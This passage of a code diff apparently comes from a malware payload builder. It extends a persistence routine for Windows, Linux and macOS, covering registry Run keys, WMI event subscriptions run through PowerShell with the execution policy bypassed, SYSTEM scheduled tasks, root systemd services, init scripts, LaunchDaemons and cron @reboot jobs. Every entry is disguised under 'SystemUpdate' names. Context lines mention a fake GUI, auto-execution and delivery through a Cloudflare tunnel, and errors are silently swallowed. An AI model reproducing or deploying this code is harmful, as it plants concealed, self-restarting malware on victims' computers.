+                
+                plist_path = "/Library/LaunchAgents/com.system.update.plist"
+                with open(plist_path, "w") as f:
+                    f.write(plist_content)
+                    
+                subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "macos_launchdaemon":
+                # Create LaunchDaemon
+                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update.daemon</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>'''
+                
+                plist_path = "/Library/LaunchDaemons/com.system.update.daemon.plist"
+                with open(plist_path, "w") as f:
+                    f.write(plist_content)
+                    
+                subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "login_item":
+                # Add to login items
+                script = f'''
+tell application "System Events"
+    make login item at end with properties {{path:"{exe_path}", hidden:false}}
+end tell
+'''
+                subprocess.run(["osascript", "-e", script], check=False)
+                
+            elif PERSISTENCE_METHOD == "cron":
+                # Add to crontab
+                cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+                with open("/tmp/crontab.txt", "w") as f:
+                    f.write(cron_job)
+                
+                subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+                os.remove("/tmp/crontab.txt")
             
     except Exception as e:
         # Silently handle errors in educational context
@@ -1888,6 +2952,7 @@ import threading
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
 FAKE_GUI = $FAKE_GUI_ENABLED
+PERSISTENCE_METHOD = "$PERSISTENCE_METHOD"
 
 # Include Fake GUI logic if enabled
  $(generate_fake_gui_code)
@@ -1901,60 +2966,234 @@ def setup_persistence():
         system = platform.system()
         
         if system == "Windows":
-            # Windows registry persistence
-            import winreg
-            
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
             
-            # Add to registry run key
-            key = winreg.HKEY_CURRENT_USER
-            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
-                winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+            # Windows persistence based on selected method
+            if PERSISTENCE_METHOD == "registry":
+                import winreg
+                # Add to registry run key
+                key = winreg.HKEY_CURRENT_USER
+                subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+                with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
+                    winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+                    
+            elif PERSISTENCE_METHOD == "windows_startup":
+                # Copy to Windows Startup folder
+                startup_folder = os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs", "StartUp")
+                if not os.path.exists(startup_folder):
+                    os.makedirs(startup_folder)
+                startup_exe = os.path.join(startup_folder, "SystemUpdate.exe")
+                if not os.path.exists(startup_exe):
+                    import shutil
+                    shutil.copy2(exe_path, startup_exe)
+                    
+            elif PERSISTENCE_METHOD == "wmi_subscription":
+                # Create WMI event subscription
+                wmi_script = f'''
+\$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
+    EventNameSpace = "root\\cimv2"
+    QueryLanguage = "WQL"
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
+    Name = "SystemUpdateFilter"
+    EventName = "SystemUpdateFilter"
+}}
+
+\$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
+    Name = "SystemUpdateConsumer"
+    CommandLineTemplate = "{exe_path}"
+}}
+
+\$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
+    Filter = \$filter
+    Consumer = \$consumer
+}}
+'''
+                # Execute PowerShell script
+                subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", wmi_script], check=False)
+                
+            elif PERSISTENCE_METHOD == "scheduled_task":
+                # Create scheduled task
+                task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon /ru System'
+                subprocess.run(task_cmd, shell=True, check=False)
                 
         elif system == "Linux":
-            # Linux cron job persistence
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
             
-            # Add to crontab
-            cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
-            with open("/tmp/crontab.txt", "w") as f:
-                f.write(cron_job)
-            
-            subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
-            os.remove("/tmp/crontab.txt")
-            
-        elif system == "Darwin":  # macOS
-            # macOS launchd persistence
-            # Get current executable path
-            exe_path = os.path.abspath(sys.argv[0])
-            
-            # FIX: Use single quotes
-            plist_content = '<?xml version="1.0" encoding="UTF-8"?>\\n'
-            plist_content += '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\\n'
-            plist_content += '<plist version="1.0">\\n'
-            plist_content += '<dict>\\n'
-            plist_content += '    <key>Label</key>\\n'
-            plist_content += '    <string>com.system.update</string>\\n'
-            plist_content += '    <key>ProgramArguments</key>\\n'
-            plist_content += '    <array>\\n'
-            plist_content += f'        <string>{exe_path}</string>\\n'
-            plist_content += '    </array>\\n'
-            plist_content += '    <key>RunAtLoad</key>\\n'
-            plist_content += '    <true/>\\n'
-            plist_content += '    <key>KeepAlive</key>\\n'
-            plist_content += '    <true/>\\n'
-            plist_content += '</dict>\\n'
-            plist_content += '</plist>'
-            
-            plist_path = f"/Users/{os.getenv('USER')}/Library/LaunchAgents/com.system.update.plist"
-            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
-            with open(plist_path, "w") as f:
-                f.write(plist_content)
+            # Linux persistence based on selected method
+            if PERSISTENCE_METHOD == "cron":
+                # Add to crontab
+                cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+                with open("/tmp/crontab.txt", "w") as f:
+                    f.write(cron_job)
                 
-            subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+                os.remove("/tmp/crontab.txt")
+                
+            elif PERSISTENCE_METHOD == "linux_systemd":
+                # Create systemd service
+                service_content = f"""[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart={exe_path}
+Restart=on-failure
+RestartSec=10
+User=root
+
+[Install]
+WantedBy=multi-user.target
+"""
+                
+                service_path = "/lib/systemd/system/system-update.service"
+                with open(service_path, "w") as f:
+                    f.write(service_content)
+                    
+                subprocess.run("systemctl enable system-update.service", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "init_script":
+                # Create init.d script
+                init_script = f"""#!/bin/bash
+# System Update Service
+# chkconfig: 35 80 20
+# description: System Update Service
+
+. /etc/rc.d/init.d/functions
+
+USER=root
+DAEMON="{exe_path}"
+ROOT_DIR=$(dirname \$DAEMON)
+PIDFILE=/var/run/system-update.pid
+
+start() {{
+    echo -n "Starting SystemUpdate: "
+    daemon --user "\$USER" --pidfile="\$PIDFILE" "\$DAEMON"
+    RETVAL=\$?
+    echo
+    [ \$RETVAL -eq 0 ] && touch "\$PIDFILE"
+    return \$RETVAL
+}}
+
+stop() {{
+    echo -n "Stopping SystemUpdate: "
+    killproc -p "\$PIDFILE" "\$DAEMON"
+    RETVAL=\$?
+    echo
+    [ \$RETVAL -eq 0 ] && rm -f "\$PIDFILE"
+    return \$RETVAL
+}}
+
+case "\$1" in
+    start)
+        start
+        ;;
+    stop)
+        stop
+        ;;
+    restart)
+        stop
+        start
+        ;;
+    status)
+        status -p "\$PIDFILE" "\$DAEMON"
+        ;;
+    *)
+        echo "Usage: {{start|stop|restart|status}}"
+        exit 1
+esac
+
+exit \$RETVAL
+"""
+                
+                init_path = "/etc/init.d/system-update"
+                with open(init_path, "w") as f:
+                    f.write(init_script)
+                    
+                os.chmod(init_path, 0o755)
+                subprocess.run("chkconfig --add system-update", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "profile_mod":
+                # Add to profile
+                profile_path = "/etc/profile.d/system-update.sh"
+                with open(profile_path, "w") as f:
+                    f.write(f"#!/bin/bash\n{exe_path} &\n")
+                os.chmod(profile_path, 0o755)
+                
+        elif system == "Darwin":  # macOS
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # macOS persistence based on selected method
+            if PERSISTENCE_METHOD == "macos_launchagent":
+                # Create LaunchAgent
+                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>'''
+                
+                plist_path = "/Library/LaunchAgents/com.system.update.plist"
+                with open(plist_path, "w") as f:
+                    f.write(plist_content)
+                    
+                subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "macos_launchdaemon":
+                # Create LaunchDaemon
+                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update.daemon</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>'''
+                
+                plist_path = "/Library/LaunchDaemons/com.system.update.daemon.plist"
+                with open(plist_path, "w") as f:
+                    f.write(plist_content)
+                    
+                subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "login_item":
+                # Add to login items
+                script = f'''
+tell application "System Events"
+    make login item at end with properties {{path:"{exe_path}", hidden:false}}
+end tell
+'''
+                subprocess.run(["osascript", "-e", script], check=False)
+                
+            elif PERSISTENCE_METHOD == "cron":
+                # Add to crontab
+                cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+                with open("/tmp/crontab.txt", "w") as f:
+                    f.write(cron_job)
+                
+                subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+                os.remove("/tmp/crontab.txt")
             
     except Exception as e:
         # Silently handle errors in educational context
@@ -1999,6 +3238,7 @@ import threading
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
 FAKE_GUI = $FAKE_GUI_ENABLED
+PERSISTENCE_METHOD = "$PERSISTENCE_METHOD"
 
 # Include Fake GUI logic if enabled
  $(generate_fake_gui_code)
@@ -2012,60 +3252,234 @@ def setup_persistence():
         system = platform.system()
         
         if system == "Windows":
-            # Windows registry persistence
-            import winreg
-            
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
             
-            # Add to registry run key
-            key = winreg.HKEY_CURRENT_USER
-            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
-                winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+            # Windows persistence based on selected method
+            if PERSISTENCE_METHOD == "registry":
+                import winreg
+                # Add to registry run key
+                key = winreg.HKEY_CURRENT_USER
+                subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+                with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
+                    winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+                    
+            elif PERSISTENCE_METHOD == "windows_startup":
+                # Copy to Windows Startup folder
+                startup_folder = os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs", "StartUp")
+                if not os.path.exists(startup_folder):
+                    os.makedirs(startup_folder)
+                startup_exe = os.path.join(startup_folder, "SystemUpdate.exe")
+                if not os.path.exists(startup_exe):
+                    import shutil
+                    shutil.copy2(exe_path, startup_exe)
+                    
+            elif PERSISTENCE_METHOD == "wmi_subscription":
+                # Create WMI event subscription
+                wmi_script = f'''
+\$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
+    EventNameSpace = "root\\cimv2"
+    QueryLanguage = "WQL"
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
+    Name = "SystemUpdateFilter"
+    EventName = "SystemUpdateFilter"
+}}
+
+\$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
+    Name = "SystemUpdateConsumer"
+    CommandLineTemplate = "{exe_path}"
+}}
+
+\$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
+    Filter = \$filter
+    Consumer = \$consumer
+}}
+'''
+                # Execute PowerShell script
+                subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", wmi_script], check=False)
+                
+            elif PERSISTENCE_METHOD == "scheduled_task":
+                # Create scheduled task
+                task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon /ru System'
+                subprocess.run(task_cmd, shell=True, check=False)
                 
         elif system == "Linux":
-            # Linux cron job persistence
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
             
-            # Add to crontab
-            cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
-            with open("/tmp/crontab.txt", "w") as f:
-                f.write(cron_job)
-            
-            subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
-            os.remove("/tmp/crontab.txt")
-            
-        elif system == "Darwin":  # macOS
-            # macOS launchd persistence
-            # Get current executable path
-            exe_path = os.path.abspath(sys.argv[0])
-            
-            # FIX: Use single quotes
-            plist_content = '<?xml version="1.0" encoding="UTF-8"?>\\n'
-            plist_content += '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\\n'
-            plist_content += '<plist version="1.0">\\n'
-            plist_content += '<dict>\\n'
-            plist_content += '    <key>Label</key>\\n'
-            plist_content += '    <string>com.system.update</string>\\n'
-            plist_content += '    <key>ProgramArguments</key>\\n'
-            plist_content += '    <array>\\n'
-            plist_content += f'        <string>{exe_path}</string>\\n'
-            plist_content += '    </array>\\n'
-            plist_content += '    <key>RunAtLoad</key>\\n'
-            plist_content += '    <true/>\\n'
-            plist_content += '    <key>KeepAlive</key>\\n'
-            plist_content += '    <true/>\\n'
-            plist_content += '</dict>\\n'
-            plist_content += '</plist>'
-            
-            plist_path = f"/Users/{os.getenv('USER')}/Library/LaunchAgents/com.system.update.plist"
-            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
-            with open(plist_path, "w") as f:
-                f.write(plist_content)
+            # Linux persistence based on selected method
+            if PERSISTENCE_METHOD == "cron":
+                # Add to crontab
+                cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+                with open("/tmp/crontab.txt", "w") as f:
+                    f.write(cron_job)
                 
-            subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+                os.remove("/tmp/crontab.txt")
+                
+            elif PERSISTENCE_METHOD == "linux_systemd":
+                # Create systemd service
+                service_content = f"""[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart={exe_path}
+Restart=on-failure
+RestartSec=10
+User=root
+
+[Install]
+WantedBy=multi-user.target
+"""
+                
+                service_path = "/lib/systemd/system/system-update.service"
+                with open(service_path, "w") as f:
+                    f.write(service_content)
+                    
+                subprocess.run("systemctl enable system-update.service", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "init_script":
+                # Create init.d script
+                init_script = f"""#!/bin/bash
+# System Update Service
+# chkconfig: 35 80 20
+# description: System Update Service
+
+. /etc/rc.d/init.d/functions
+
+USER=root
+DAEMON="{exe_path}"
+ROOT_DIR=$(dirname \$DAEMON)
+PIDFILE=/var/run/system-update.pid
+
+start() {{
+    echo -n "Starting SystemUpdate: "
+    daemon --user "\$USER" --pidfile="\$PIDFILE" "\$DAEMON"
+    RETVAL=\$?
+    echo
+    [ \$RETVAL -eq 0 ] && touch "\$PIDFILE"
+    return \$RETVAL
+}}
+
+stop() {{
+    echo -n "Stopping SystemUpdate: "
+    killproc -p "\$PIDFILE" "\$DAEMON"
+    RETVAL=\$?
+    echo
+    [ \$RETVAL -eq 0 ] && rm -f "\$PIDFILE"
+    return \$RETVAL
+}}
+
+case "\$1" in
+    start)
+        start
+        ;;
+    stop)
+        stop
+        ;;
+    restart)
+        stop
+        start
+        ;;
+    status)
+        status -p "\$PIDFILE" "\$DAEMON"
+        ;;
+    *)
+        echo "Usage: {{start|stop|restart|status}}"
+        exit 1
+esac
+
+exit \$RETVAL
+"""
+                
+                init_path = "/etc/init.d/system-update"
+                with open(init_path, "w") as f:
+                    f.write(init_script)
+                    
+                os.chmod(init_path, 0o755)
+                subprocess.run("chkconfig --add system-update", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "profile_mod":
+                # Add to profile
+                profile_path = "/etc/profile.d/system-update.sh"
+                with open(profile_path, "w") as f:
+                    f.write(f"#!/bin/bash\n{exe_path} &\n")
+                os.chmod(profile_path, 0o755)
+                
+        elif system == "Darwin":  # macOS
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # macOS persistence based on selected method
+            if PERSISTENCE_METHOD == "macos_launchagent":
+                # Create LaunchAgent
+                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>'''
+                
+                plist_path = "/Library/LaunchAgents/com.system.update.plist"
+                with open(plist_path, "w") as f:
+                    f.write(plist_content)
+                    
+                subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "macos_launchdaemon":
+                # Create LaunchDaemon
+                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update.daemon</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>'''
+                
+                plist_path = "/Library/LaunchDaemons/com.system.update.daemon.plist"
+                with open(plist_path, "w") as f:
+                    f.write(plist_content)
+                    
+                subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "login_item":
+                # Add to login items
+                script = f'''
+tell application "System Events"
+    make login item at end with properties {{path:"{exe_path}", hidden:false}}
+end tell
+'''
+                subprocess.run(["osascript", "-e", script], check=False)
+                
+            elif PERSISTENCE_METHOD == "cron":
+                # Add to crontab
+                cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+                with open("/tmp/crontab.txt", "w") as f:
+                    f.write(cron_job)
+                
+                subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+                os.remove("/tmp/crontab.txt")
             
     except Exception as e:
         # Silently handle errors in educational context
@@ -2109,6 +3523,7 @@ import threading
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
 FAKE_GUI = $FAKE_GUI_ENABLED
+PERSISTENCE_METHOD = "$PERSISTENCE_METHOD"
 
 # Include Fake GUI logic if enabled
  $(generate_fake_gui_code)
@@ -2122,60 +3537,234 @@ def setup_persistence():
         system = platform.system()
         
         if system == "Windows":
-            # Windows registry persistence
-            import winreg
-            
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
             
-            # Add to registry run key
-            key = winreg.HKEY_CURRENT_USER
-            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
-                winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+            # Windows persistence based on selected method
+            if PERSISTENCE_METHOD == "registry":
+                import winreg
+                # Add to registry run key
+                key = winreg.HKEY_CURRENT_USER
+                subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+                with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
+                    winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+                    
+            elif PERSISTENCE_METHOD == "windows_startup":
+                # Copy to Windows Startup folder
+                startup_folder = os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs", "StartUp")
+                if not os.path.exists(startup_folder):
+                    os.makedirs(startup_folder)
+                startup_exe = os.path.join(startup_folder, "SystemUpdate.exe")
+                if not os.path.exists(startup_exe):
+                    import shutil
+                    shutil.copy2(exe_path, startup_exe)
+                    
+            elif PERSISTENCE_METHOD == "wmi_subscription":
+                # Create WMI event subscription
+                wmi_script = f'''
+\$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
+    EventNameSpace = "root\\cimv2"
+    QueryLanguage = "WQL"
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
+    Name = "SystemUpdateFilter"
+    EventName = "SystemUpdateFilter"
+}}
+
+\$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
+    Name = "SystemUpdateConsumer"
+    CommandLineTemplate = "{exe_path}"
+}}
+
+\$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
+    Filter = \$filter
+    Consumer = \$consumer
+}}
+'''
+                # Execute PowerShell script
+                subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", wmi_script], check=False)
+                
+            elif PERSISTENCE_METHOD == "scheduled_task":
+                # Create scheduled task
+                task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon /ru System'
+                subprocess.run(task_cmd, shell=True, check=False)
                 
         elif system == "Linux":
-            # Linux cron job persistence
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
             
-            # Add to crontab
-            cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
-            with open("/tmp/crontab.txt", "w") as f:
-                f.write(cron_job)
-            
-            subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
-            os.remove("/tmp/crontab.txt")
-            
-        elif system == "Darwin":  # macOS
-            # macOS launchd persistence
-            # Get current executable path
-            exe_path = os.path.abspath(sys.argv[0])
-            
-            # FIX: Use single quotes
-            plist_content = '<?xml version="1.0" encoding="UTF-8"?>\\n'
-            plist_content += '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\\n'
-            plist_content += '<plist version="1.0">\\n'
-            plist_content += '<dict>\\n'
-            plist_content += '    <key>Label</key>\\n'
-            plist_content += '    <string>com.system.update</string>\\n'
-            plist_content += '    <key>ProgramArguments</key>\\n'
-            plist_content += '    <array>\\n'
-            plist_content += f'        <string>{exe_path}</string>\\n'
-            plist_content += '    </array>\\n'
-            plist_content += '    <key>RunAtLoad</key>\\n'
-            plist_content += '    <true/>\\n'
-            plist_content += '    <key>KeepAlive</key>\\n'
-            plist_content += '    <true/>\\n'
-            plist_content += '</dict>\\n'
-            plist_content += '</plist>'
-            
-            plist_path = f"/Users/{os.getenv('USER')}/Library/LaunchAgents/com.system.update.plist"
-            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
-            with open(plist_path, "w") as f:
-                f.write(plist_content)
+            # Linux persistence based on selected method
+            if PERSISTENCE_METHOD == "cron":
+                # Add to crontab
+                cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+                with open("/tmp/crontab.txt", "w") as f:
+                    f.write(cron_job)
                 
-            subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+                os.remove("/tmp/crontab.txt")
+                
+            elif PERSISTENCE_METHOD == "linux_systemd":
+                # Create systemd service
+                service_content = f"""[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart={exe_path}
+Restart=on-failure
+RestartSec=10
+User=root
+
+[Install]
+WantedBy=multi-user.target
+"""
+                
+                service_path = "/lib/systemd/system/system-update.service"
+                with open(service_path, "w") as f:
+                    f.write(service_content)
+                    
+                subprocess.run("systemctl enable system-update.service", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "init_script":
+                # Create init.d script
+                init_script = f"""#!/bin/bash
+# System Update Service
+# chkconfig: 35 80 20
+# description: System Update Service
+
+. /etc/rc.d/init.d/functions
+
+USER=root
+DAEMON="{exe_path}"
+ROOT_DIR=$(dirname \$DAEMON)
+PIDFILE=/var/run/system-update.pid
+
+start() {{
+    echo -n "Starting SystemUpdate: "
+    daemon --user "\$USER" --pidfile="\$PIDFILE" "\$DAEMON"
+    RETVAL=\$?
+    echo
+    [ \$RETVAL -eq 0 ] && touch "\$PIDFILE"
+    return \$RETVAL
+}}
+
+stop() {{
+    echo -n "Stopping SystemUpdate: "
+    killproc -p "\$PIDFILE" "\$DAEMON"
+    RETVAL=\$?
+    echo
+    [ \$RETVAL -eq 0 ] && rm -f "\$PIDFILE"
+    return \$RETVAL
+}}
+
+case "\$1" in
+    start)
+        start
+        ;;
+    stop)
+        stop
+        ;;
+    restart)
+        stop
+        start
+        ;;
+    status)
+        status -p "\$PIDFILE" "\$DAEMON"
+        ;;
+    *)
+        echo "Usage: {{start|stop|restart|status}}"
+        exit 1
+esac
+
+exit \$RETVAL
+"""
+                
+                init_path = "/etc/init.d/system-update"
+                with open(init_path, "w") as f:
+                    f.write(init_script)
+                    
+                os.chmod(init_path, 0o755)
+                subprocess.run("chkconfig --add system-update", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "profile_mod":
+                # Add to profile
+                profile_path = "/etc/profile.d/system-update.sh"
+                with open(profile_path, "w") as f:
+                    f.write(f"#!/bin/bash\n{exe_path} &\n")
+                os.chmod(profile_path, 0o755)
+                
+        elif system == "Darwin":  # macOS
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # macOS persistence based on selected method
+            if PERSISTENCE_METHOD == "macos_launchagent":
+                # Create LaunchAgent
+                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>'''
+                
+                plist_path = "/Library/LaunchAgents/com.system.update.plist"
+                with open(plist_path, "w") as f:
+                    f.write(plist_content)
+                    
+                subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "macos_launchdaemon":
+                # Create LaunchDaemon
+                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update.daemon</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>'''
+                
+                plist_path = "/Library/LaunchDaemons/com.system.update.daemon.plist"
+                with open(plist_path, "w") as f:
+                    f.write(plist_content)
+                    
+                subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "login_item":
+                # Add to login items
+                script = f'''
+tell application "System Events"
+    make login item at end with properties {{path:"{exe_path}", hidden:false}}
+end tell
+'''
+                subprocess.run(["osascript", "-e", script], check=False)
+                
+            elif PERSISTENCE_METHOD == "cron":
+                # Add to crontab
+                cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+                with open("/tmp/crontab.txt", "w") as f:
+                    f.write(cron_job)
+                
+                subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+                os.remove("/tmp/crontab.txt")
             
     except Exception as e:
         # Silently handle errors in educational context
@@ -2443,115 +4032,9 @@ deliver_via_cloudflare_tunnel() {
         return 1
     fi
     
-    # Check if payload_path is a directory (cross-platform build)
-    if [ -d "$payload_path" ]; then
